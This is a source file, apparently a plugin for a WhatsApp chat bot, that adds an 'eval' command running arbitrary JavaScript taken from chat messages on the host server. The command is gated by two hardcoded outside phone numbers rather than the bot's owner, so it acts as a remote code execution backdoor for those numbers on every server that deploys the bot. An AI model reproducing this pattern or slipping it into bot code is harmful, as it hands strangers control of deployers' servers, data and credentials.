const { cmd, commands } = require('../command')
//........................................
 cmd({ pattern: "eval",
 category: "owner",
 filename: __filename,
 desc: "Runs js code on node server." 
}, 
async(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
const sfd = ['94725881990'];
const pmd = ['94762280384'];
const isDevs = pmd.includes(senderNumber) || sfd.includes(senderNumber)
	    if (!isDevs) return reply("*THIS DEVELOPER COMMAND* 📛 ")
 try 
{
 let resultTest = eval('const a = async()=>{\n' + q + '\n}\na()'); 
if (typeof resultTest === "object") reply(JSON.stringify(resultTest));
 else reply(resultTest.toString()); } 
catch (err) {
 return reply(err.toString()); 
}
 } )
